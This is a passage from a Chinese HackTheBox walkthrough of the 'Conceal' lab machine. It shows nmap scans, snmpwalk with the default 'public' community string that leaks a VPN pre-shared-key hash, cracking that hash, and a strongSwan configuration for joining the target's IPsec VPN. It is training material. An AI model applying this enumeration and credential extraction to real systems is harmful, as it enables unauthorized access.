@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Conceal - T0x1c</title>
+
+  
+    <meta name="description" content="Conceal是一个困难的靶机，知识点涉及snmp默认口令漏洞、IPsec VPN连接、ftp匿名登陆漏洞、asp文件上传、烂土豆内核提权等。IPsec VPN在其中扮演着重要的角色，连接VPN后我们才能反弹shell并最终通过烂土豆提权。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Conceal">
+<meta property="og:url" content="https://toxic80l.github.io/post/a8d56bb4/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Conceal是一个困难的靶机，知识点涉及snmp默认口令漏洞、IPsec VPN连接、ftp匿名登陆漏洞、asp文件上传、烂土豆内核提权等。IPsec VPN在其中扮演着重要的角色，连接VPN后我们才能反弹shell并最终通过烂土豆提权。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0160.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-16%20%E4%B8%8B%E5%8D%889.46.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%881.49.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.26.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/2.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.36.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.37.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.37.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.46.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.57.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%883.00.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/1.jpg">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%886.12.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.04.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.14.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.09.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.25.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.23.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.56.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.56.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.27.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.03.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.03.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.09.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.16.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.24.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.26.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.28.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.35.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.36.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.42.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.53.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.54.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.55.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%885.59.28.png">
+<meta property="article:published_time" content="2022-01-25T09:49:48.000Z">
+<meta property="article:modified_time" content="2022-01-26T02:24:41.443Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0160.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#500%E7%AB%AF%E5%8F%A3-udp"><span class="toc-text">500端口-udp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#161%E7%AB%AF%E5%8F%A3-udp"><span class="toc-text">161端口-udp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%85%B1%E4%BA%AB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96"><span class="toc-text">预共享密钥获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9AIPsec"><span class="toc-text">扩展：IPsec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F"><span class="toc-text">模式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-destitute"><span class="toc-text">0x02 上线[destitute]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5IPsec-VPN"><span class="toc-text">连接IPsec VPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-1"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="toc-text">21端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x03 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-text">查询内核漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-text">尝试烂土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-text">烂土豆提权</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-25T09:49:48.000Z">2022-01-25</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Conceal</span></h1>
+<p>Conceal是一个困难的靶机，知识点涉及snmp默认口令漏洞、IPsec VPN连接、ftp匿名登陆漏洞、asp文件上传、烂土豆内核提权等。IPsec VPN在其中扮演着重要的角色，连接VPN后我们才能反弹shell并最终通过烂土豆提权。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0160.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-16%20%E4%B8%8B%E5%8D%889.46.29.png" alt="截屏2021-10-16 下午9.46.29"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.116 -oA nmap_Conceal</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%881.49.11.png" alt="截屏2021-10-17 上午1.49.11"><br>但是扫描结果并没有返回端口，于是开始扫描udp端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sU -p- 10.10.10.116 -oA nmap_Conceal_1 --min-rate 1000</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.26.41.png" alt="截屏2021-10-17 上午2.26.41"><br>扫描结果显示开放端口为500，但是不知道isakmp服务是什么</p>
+<h4 id="500端口-udp"><a href="#500端口-udp" class="headerlink" title="500端口-udp"></a>500端口-udp</h4><p>查询万能的谷歌老师后发现这其实就是IKE，说明目标靶机上存在 IPsec VPN<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/2.png" alt="2"></p>
+<h4 id="161端口-udp"><a href="#161端口-udp" class="headerlink" title="161端口-udp"></a>161端口-udp</h4><p>使用nmap对 top 20 的端口进行脚本扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sU -sC --top-ports 20 10.10.10.116 -oA nmap_Conceal_2 --min-rate 1000</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.36.53.png" alt="截屏2021-10-17 上午2.36.53"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.37.28.png" alt="截屏2021-10-17 上午2.37.28"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.37.59.png" alt="截屏2021-10-17 上午2.37.59"><br>通过扫描结果可以发现 snmp 端口也开着，其中显示包含一系列端口、进程列表说明目标 snmp 端口存在默认口令</p>
+<h3 id="预共享密钥获取"><a href="#预共享密钥获取" class="headerlink" title="预共享密钥获取"></a>预共享密钥获取</h3><p>使用 snmpwalk 通过默认snmp密码 public 对161端口进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public 10.10.10.116</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.46.54.png" alt="截屏2021-10-17 上午2.46.54"><br>结果发现在开头就已经显示 IKE VPN password PSK 的值</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">9C8B1A372B1878851BE2C097031B6E43</span></span><br></pre></td></tr></table></figure>
+<p>通过解密网站对密钥值进行解密<br><strong>解密网站：<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%882.57.33.png" alt="截屏2021-10-17 上午2.57.33"><br>成功解密为<code>Dudecake1!</code>，之后使用 ike-scan 对 IPsec VPN 进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan -M 10.10.10.116</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%883.00.58.png" alt="截屏2021-10-17 上午3.00.58"><br>扫描结果显示以下几点信息</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ike使用三种加密，分别为3DES、SHA1、modp1024进行加密</span></span><br><span class="line"><span class="string">身份验证是预共享密钥（PSK）</span></span><br><span class="line"><span class="string">IKE版本为v1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="扩展：IPsec"><a href="#扩展：IPsec" class="headerlink" title="扩展：IPsec"></a>扩展：IPsec</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>IPsec 是一套用于保护IP层流量的工具，通过两种协议来提供不同的安全保证：</p>
+<ul>
+<li>身份验证标头（AH），主要用于提供数据完整性（将知道数据在发送方之间是否被修改）、数据源身份验证（将知道源是否不是该连接所期望的），并有效防止重放攻击</li>
+<li>封装安全paylaod（ESP），提供类似功能以及保密性（中间人无法看到数据）<br>安全关联（SA）则是用一组算法来动态交换密钥通过AH或ESP建立安全连接</li>
+</ul>
+<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h4><p>AH 和 ESP 都可以在以下两种模式下运行：</p>
+<ul>
+<li>传输模式：在两台主机之间提供安全服务，应用于IP数据包的payload，但IP标头被保留以提供路由选择</li>
+<li>隧道模式：整个数据包被加密货验证，它成为一个新IP数据包的payload，带有一个标题，将它发送到另一端，而在另一端，数据包被加密并根据解密的报头发送</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/1.jpg" alt="1"><br>鉴于这台主机不太可能存在网络，所以判断它采用的模式为传输模式</p>
+<h2 id="0x02-上线-destitute"><a href="#0x02-上线-destitute" class="headerlink" title="0x02 上线[destitute]"></a>0x02 上线[destitute]</h2><h3 id="连接IPsec-VPN"><a href="#连接IPsec-VPN" class="headerlink" title="连接IPsec VPN"></a>连接IPsec VPN</h3><p>使用 strongswan 连接VPN，安装工具可执行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install strongswan</span><br></pre></td></tr></table></figure>
+<p>配置需要编辑<code>/etc/ipsec.conf</code>和<code>/etc/ipsec.secrets</code></p>
+<p><strong>参考文章：<a target="_blank" rel="noopener" href="https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/">https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/</a></strong></p>
+<p>在 ipsec.secrets 中写入传输密钥</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file holds shared secrets or RSA private keys for authentication.</span></span><br><span class="line"></span><br><span class="line"><span class="string">%any</span> <span class="string">:</span> <span class="string">PSK</span> <span class="string">&quot;Dudecake1!&quot;</span></span><br></pre></td></tr></table></figure>
+<p>在 ipsec.conf 中写入双方IP、加密模式以及模式类型等</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ipsec.conf - strongSwan IPsec configuration file</span></span><br><span class="line"></span><br><span class="line"><span class="string">config</span> <span class="string">setup</span></span><br><span class="line">    <span class="string">charondebug=&quot;all&quot;</span></span><br><span class="line">    <span class="string">uniqueids=yes</span></span><br><span class="line">    <span class="string">strictcrlpolicy=no</span></span><br><span class="line">    </span><br><span class="line"><span class="string">conn</span> <span class="string">conceal</span></span><br><span class="line">    <span class="string">authby=secret</span></span><br><span class="line">    <span class="string">auto=route</span></span><br><span class="line">    <span class="string">keyexchange=ikev1</span></span><br><span class="line">    <span class="string">ike=3des-sha1-modp1024</span></span><br><span class="line">    <span class="string">left=10.10.14.2</span></span><br><span class="line">    <span class="string">right=10.10.10.116</span></span><br><span class="line">    <span class="string">type=transport</span></span><br><span class="line">    <span class="string">esp=3des-sha1</span></span><br><span class="line">    <span class="string">rightprotoport=tcp</span></span><br></pre></td></tr></table></figure>
+
+<p>配置完成后开始连接IPsec VPN</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipsec restart</span><br><span class="line">ipsec up conceal</span><br></pre></td></tr></table></figure>
+<p>但是出现错误如下错误：不支持 3des_cbc<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%886.12.23.png" alt="截屏2021-10-17 上午6.12.23"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a8d56bb4/%E6%88%AA%E5%B1%8F2021-10-17%20%E4%B8%8A%E5%8D%884.04.35.png" alt="截屏2021-10-17 上午4.04.35"><br>需要安装相关插件包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libstrongswan-standard-plugins  libstrongswan-extra-plugins</span><br></pre></td></tr></table></figure>
